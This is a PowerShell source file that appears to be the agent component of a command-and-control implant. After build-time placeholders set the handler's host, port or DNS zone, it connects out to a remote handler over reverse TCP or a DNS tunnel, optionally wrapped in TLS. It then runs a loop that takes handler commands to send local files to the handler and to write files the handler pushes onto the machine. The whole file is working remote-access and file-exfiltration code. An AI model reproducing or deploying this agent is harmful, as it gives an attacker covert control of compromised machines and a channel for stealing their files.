
function Handle-Message([PSObject] $transport, [PSObject] $msg) {
    if ($msg.channelnumber -eq $MESSAGE_CHANNEL_COMMAND) {
        if ($msg.mtype -eq $MESSAGE_TYPE_COMMAND) {
            # TODO: handle command
            return $false
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_MESSAGE) {
            $text = New-Object String($msg.content, 0, $msg.leng)
            Print-Message "HANDLER: $($text)"
            return $true
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_ERRORMESSAGE) {
            $text = New-Object String($msg.content, 0, $msg.leng)
            Print-Error "HANDLER: $($text)"
            return $true
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_DOWNLOADCOMMAND) {
            $downloadchannelid = [Int16][BitConverter]::ToInt16($msg.content, 0)
	        $downloadchannelid = [UInt16][System.Net.IPAddress]::NetworkToHostOrder([Int16]$downloadchannelid)
	        $filenamelen = ($msg.leng) - 2
            $filename = New-Object String($msg.content, 2, $filenamelen)
            $job = Command-SendFile $downloadchannelid $filename $transport
            $Runningthreads.Add($job)
            return $true
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_UPLOADCOMMAND) {
            $channelid = [Int16][BitConverter]::ToInt16($msg.content, 0)
	        $channelid = [UInt16][System.Net.IPAddress]::NetworkToHostOrder([Int16]$channelid)
	        $filenamelen = ($msg.leng) - 2
            $filename = New-Object String($msg.content, 2, $filenamelen)
            $job = Command-ReceiveFile $channelid $filename $transport
            $Runningthreads.Add($job)
            return $true
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_EOC) {
            Print-Error "received close message from handler, exiting..."
            Channel-setClosed $Channels[$MESSAGE_CHANNEL_COMMAND]
            return $true
        } else {
            # TODO: implement other types
            Print-Error "message with invalid type received: $($msg.mtype)"
            return $false
        }
    } else {
        if ((! $Channels.ContainsKey($msg.channelnumber)) -and ($msg.mtype -eq $MESSAGE_TYPE_EOC)) {
            Print-Debug "received delayed EOC message for unknown channel $($msg.channelnumber), ignoring"
            return $true
        } elseif (! $Channels.ContainsKey($msg.channelnumber)) {
            Print-Error "message with unknown channel number ($($msg.channelnumber)) received, droping"
            return $false
        } elseif (Channel-isReserved $Channels[$msg.channelnumber]) {
            Channel-setOpen $Channels[$msg.channelnumber]
        } elseif (Channel-isClosed $Channels[$msg.channelnumber]) {
            $message1 = Message-Create -MType $MESSAGE_TYPE_EOC -ChannelNumber $msg.channelnumber -Content $MESSAGE_EMPTY_CONTENT
            Message-SendToTransport $message1 $transport
            return $false
        }

        if ($msg.mtype -eq $MESSAGE_TYPE_DATA) {
            Channel-WriteFromSend $Channels[$msg.channelnumber] $msg.content
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_EOC) {
            Channel-setClosed $Channels[$msg.channelnumber]
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_SIZE) {
            $size = [System.Text.Encoding]::UTF8.GetString($msg.content)
            Print-Debug "message size for channel $($msg.channelnumber) received: $($size)"
            # TODO: store this size somewhere in the channel? use it somehow?
        } else {
            Print-Error "received invalid command for channel $($msg.channelnumber): $($msg.mtype)"
            return $false
        }

        # TODO: implement further channels functions
        return $true
    }
}

function Command-SendFile([UInt16] $downloadchannelid, [string] $filename, [PSObject] $transport) {
    Print-Message "sending file to handler: $($filename) (channel: $($downloadchannelid))"

    if ($Channels.ContainsKey($downloadchannelid)) {
        Print-Error "download channel id is already in use"
        return
    }

    $Channels.Add($downloadchannelid, (Channel-Open))
    Channel-setOpen $Channels[$downloadchannelid]


    try {
        $fs = new-object IO.FileStream($filename, [IO.FileMode]::Open)
        Print-Message "file has $($fs.Length) bytes"
        $size = [System.Text.Encoding]::UTF8.GetBytes("$($fs.Length)")
        $fs.Close()

        # send size to handler
        $sizemsg = Message-Create -MType $MESSAGE_TYPE_SIZE -ChannelNumber $downloadchannelid -Content $size
        Message-SendToTransport $sizemsg $transport
    } catch {
        Print-Error "could not open file for reading"
        # TODO: send error to handler!
        return
    }


    $script = {
        param([string]$filename, [PSObject]$channel)
        Print-Debug "[ASYNC SendFile] filename = $($filename), channel = $($channel)"

        $fs = new-object IO.FileStream($filename, [IO.FileMode]::Open)

        $buf = new-object byte[] 1024

        $reader = new-object IO.BinaryReader($fs)
        while ($true) {
            $br = $reader.Read($buf, 0, 1024)
            if ($br -eq 0) {
                break;
            }
            #Channel-Write $channel $buf $br # cannot call this function from job, hacking it
            for($i=0; $i -lt $br; ++$i) {
                $channel.sendqueue.Enqueue($buf[$i])
            }
            Print-Debug "[ASYNC SendFile] wrote $($br) bytes"
        }
        $reader.Close()
        #Channel-setClosed $channel # cannot call this function from job, hacking it
        $channel.state = "CLOSED"
        Print-Debug "[ASYNC SendFile] done and closed"

    }

    $p = [PowerShell]::Create()
    $null = $p.AddScript($ADDTOSCRIPTS).AddScript($script).AddArgument($filename).AddArgument($Channels[$downloadchannelid])
    $job = $p.BeginInvoke()
    Print-Debug "started backgroud write process"

    return New-Object -TypeName PSObject -Property @{
       'shell' = $p
       'job' = $job
    }
}

function Command-ReceiveFile([UInt16] $channelid, [string] $filename, [PSObject] $transport) {
    Print-Message "receiving file from handler: $($filename) (channel: $($channelid))"

    if ($Channels.ContainsKey($channelid)) {
        Print-Error "upload channel id is already in use"
        return
    }

    $Channels.Add($channelid, (Channel-Open))
    # handler has to send, we are not opening the channel on our side

    try {
        $fs = new-object IO.FileStream($filename, [IO.FileMode]::Create)
        $fs.Close()
    } catch {
        Print-Error "could not open file for writing"
        # TODO: send error to handler!
        return
    }

    $script = {
        param([string]$filename, [PSObject]$channel)

        Print-Debug "[ASYNC ReceiveFile] waiting for channel to open"
        while ($channel.state -eq "RESERVED") {}
        Print-Debug "[ASYNC ReceiveFile] channel opened"

        $fs = new-object IO.FileStream($filename, [IO.FileMode]::Create)

        $writer = new-object IO.BinaryWriter($fs)
        while ($true) {
            Print-Debug "[ASYNC ReceiveFile] waiting for data in channel"
            while (($channel.state -eq "OPEN") -and ($channel.receivequeue.Count -eq 0)) {
                Start-Sleep -Milliseconds 100
            }
            if (($channel.state -eq "CLOSED") -and ($channel.receivequeue.Count -eq 0)) {
                Print-Debug "[ASYNC ReceiveFile] channel closed"
                break
            }

            Print-Debug "[ASYNC ReceiveFile] channel has $($channel.receivequeue.Count) bytes of data"

            #Channel-Read $channel 1024 # cannot call this function from job, hacking it
            $readlen = 102400
            if ($channel.receivequeue.Count -lt $readlen) {
                $readlen = $channel.receivequeue.Count;
            }
            $bytes = New-Object byte[]($readlen);
            for ($i=0; $i -lt $readlen; ++$i) {
                $bytes[$i] = $channel.receivequeue.Dequeue();
            }

            $writer.Write($bytes, 0, $readlen)
            Print-Debug "[ASYNC ReceiveFile] copied $($readlen) bytes from channel"
        }
        Print-Debug "[ASYNC ReceiveFile] done"
        $writer.Close()
        $fs.Close()
    }

    $p = [PowerShell]::Create()
    $null = $p.AddScript($ADDTOSCRIPTS).AddScript($script).AddArgument($filename).AddArgument($Channels[$channelid])
    $job = $p.BeginInvoke()
    Print-Debug "started backgroud read process"

    #$done = $job.AsyncWaitHandle.WaitOne()
    #$p.EndInvoke($job)

    return New-Object -TypeName PSObject -Property @{
       'shell' = $p
       'job' = $job
    }

}

function ReceiveHeader-Async-Start([PSObject] $transport) {

    $script = {
        param([UInt32]$messageheaderlen, [PSObject]$transport, [PSObject]$initialtransport, [string]$connectionmethod, [string]$channelencryption)

        # This is a copy of the Transport-Tls-Receive / Transport-ReverseTcp-Receive function
        # with some special case handling for DNS
        $numb = 0
	    $buffer = New-Object byte[]($messageheaderlen)
	    while ($numb -lt $messageheaderlen) {
	        if ($connectionmethod -eq "REVERSETCP") {
		        $numb += $transport.reader.Read($buffer, $numb, $messageheaderlen-$numb)
		    } elseif ($connectionmethod -eq "DNS") {
		        while (!($initialtransport.stream.HasData())) {}
		        if ($channelencryption -eq "NONE") {
		            $numb += $transport.stream.Read($buffer, $numb, $messageheaderlen-$numb)
		        } elseif ($channelencryption -eq "TLS") {
		            Print-Debug "[ASYNC ReceiveHeader] trying to read TLS channel..."
		            $numb += $transport.reader.Read($buffer, $numb, $messageheaderlen-$numb)
		            Print-Debug "[ASYNC ReceiveHeader] done reading TLS channel."
		        } else {
		            Print-Debug "[ASYNC ReceiveHeader] invalid channelencryption for DNS"
		            # TODO: report as error instead
		            return $NULL
		        }
		    } else {
		        Print-Debug "[ASYNC ReceiveHeader] invalid connectionmethod"
		        # TODO: report as error instead
		        return $NULL
		    }
	    }

	    return $buffer
    }

    $p = [PowerShell]::Create()
    $null = $p.AddScript($ADDTOSCRIPTS).AddScript($script).AddArgument($MESSAGE_HEADER_LEN).AddArgument($transport).AddArgument($initialtransport).AddArgument($CONNECTIONMETHOD).AddArgument($CHANNELENCRYPTION)
    $job = $p.BeginInvoke()
    Print-Debug "started background receive header process"

    return New-Object -TypeName PSObject -Property @{
       'shell' = $p
       'job' = $job
    }

}

function ReceiveHeader-Async-IsDone([PSObject] $asyncobj) {

    return $asyncobj.job.IsCompleted

}

function ReceiveHeader-Async-GetResult([PSObject] $asyncobj) {

    Print-Debug "ending background receive header process..."
    $res = $asyncobj.shell.EndInvoke($asyncobj.job)
    $asyncobj.shell.Dispose()
    Print-Debug "ended background receive header process."
    return $res

}


# Recycle stager variables
if ($fp) {
    $servercertfp = $fp
} else {
    $servercertfp = "SYREPLACE_SERVERCERTFINGERPRINT"
}

$CONNECTIONMETHOD = "SYREPLACE_CONNECTIONMETHOD"
$CHANNELENCRYPTION = "SYREPLACE_CHANNELENCRYPTION"
$CONNECTHOST = "SYREPLACE_CONNECTHOST"
$CONNECTPORT = "SYREPLACE_CONNECTPORT"
$DNSZONE = "SYREPLACE_DNSZONE"
$DNSSERVER = "SYREPLACE_DNSSERVER"
$TIMEOUT = "SYREPLACE_TIMEOUT"
$RETRIES = "SYREPLACE_RETRIES"

$Channels = @{ $MESSAGE_CHANNEL_COMMAND = Channel-Open }
$Runningthreads = New-Object System.Collections.Generic.List[PSObject]

if ($CONNECTIONMETHOD -eq "REVERSETCP") {
    $initialtransport = Transport-ReverseTcp-Open -LHost $CONNECTHOST -LPort $CONNECTPORT
} elseif ($CONNECTIONMETHOD -eq "DNS") {
    $initialtransport = Transport-Dns-Open -Zone $DNSZONE -DnsServer $DNSSERVER -timeout $TIMEOUT -retries $RETRIES
} else {
    Print-Error "connection method not defined"
    Exit(1)
}

if ($CHANNELENCRYPTION -eq "NONE") {
    Print-Message "Warning: CONNECTION UNENCRYPTED"
    $transport = $initialtransport
} elseif ($CHANNELENCRYPTION -eq "TLS") {
    if ($CONNECTIONMETHOD -eq "REVERSETCP") {
        $stream = $initialtransport.tcpStream
    } elseif ($CONNECTIONMETHOD -eq "DNS") {
        $stream = $initialtransport.stream
    }
    $transport = Transport-Tls-Open $stream $servercertfp
} else {
    Print-Error "wrapper method not defined"
    Exit(1)
}


try {

Channel-setOpen $Channels[$MESSAGE_CHANNEL_COMMAND]

# show hello message from handler
#$res = Message-ParseFromTransport $transport
#$res = Handle-Message $transport $res

#Print-Debug "sending hello to handler"

# send hello message to handler
$text = [System.Text.Encoding]::UTF8.GetBytes("Hello from Agent")
$message1 = Message-Create -MType $MESSAGE_TYPE_MESSAGE -ChannelNumber $MESSAGE_CHANNEL_COMMAND -Content $text
Message-SendToTransport $message1 $transport

#Print-Debug "send hello to handler"

# try to read message headers in the background
$asyncobj = ReceiveHeader-Async-Start $transport

# main loop to send and receive data
while (Channel-isOpen $Channels[$MESSAGE_CHANNEL_COMMAND]) {

    # try to read a message from the handler
    while ( ReceiveHeader-Async-IsDone $asyncobj ) {
        # receive result of the async job
        $messageheaders = ReceiveHeader-Async-GetResult $asyncobj
        Print-Debug "messageheaders = $($messageheaders)"
        if ($CONNECTIONMETHOD -eq "DNS") {
            Print-Debug "next request-number =" $initialtransport.requestid
        }


        # receive full message object and handle it
        $msg = Message-ParseFromTransport $transport $messageheaders
        $res = Handle-Message $transport $msg
        # TODO: report error on $res -eq $false

        # and try to read the next one
        $asyncobj = ReceiveHeader-Async-Start $transport
    }

    # store list of channels that can be closed now
    $channelstoremove = @{ }

    # set this flag if we have sended at least one package
    $hassended = $false

    # send data for each channel
    foreach ($chanid in $Channels.Keys) {
        if ($chanid -eq $MESSAGE_CHANNEL_COMMAND) {
            continue  # the command channel is different still
        }
        if (Channel-HasDataToSend($Channels[$chanid])) {
            Print-Debug "sending data"
            $data = Channel-ReadToSend $Channels[$chanid] $MESSAGE_MAX_DATA_LEN
            #Print-Debug "sending data: $($data)"
            $msg = Message-Create -MType $MESSAGE_TYPE_DATA -ChannelNumber $chanid -Content $data
            Message-SendToTransport $msg $transport
            $hassended = $true
        } elseif (Channel-isClosed($Channels[$chanid])) {
            Print-Debug "sending EOC"
            $msg = Message-Create -MType $MESSAGE_TYPE_EOC -ChannelNumber $chanid -Content $MESSAGE_EMPTY_CONTENT
            Message-SendToTransport $msg $transport
            $hassended = $true
            $channelstoremove.Add($chanid, $chanid)
        }
    }

    # remove closed channels from list
    foreach ($chanid in $channelstoremove.Keys) {
        $Channels.Remove($chanid)
    }

    # if we must poll, always send at least one package
    if ((!$hassended) -and ($CONNECTIONMETHOD -eq "DNS")) {
        Print-Debug "sending a polling NODATA message to handler"
        $initialtransport.stream.Write($NULL, 0, 0);
    }

}


} finally {

# stop async refresh
Print-Debug "stoping background message reading"
$asyncobj.shell.Dispose()

# terminate all jobs on exit
Print-Debug "stoping background jobs"
foreach($t in $Runningthreads) {
    #if ($t.job.IsCompleted) {
    #    $t.shell.EndInvoke($t.job)
    #}
    # TODO: if jobs have opened files, consider closing them here
    $t.shell.Dispose()
}


if ($CHANNELENCRYPTION -eq "TLS") {
    Transport-Tls-Close $transport
}

if ($CONNECTIONMETHOD -eq "REVERSETCP") {
    Transport-ReverseTcp-Close $initialtransport
} elseif ($CONNECTIONMETHOD -eq "DNS") {
    Transport-Dns-Close $initialtransport
}

}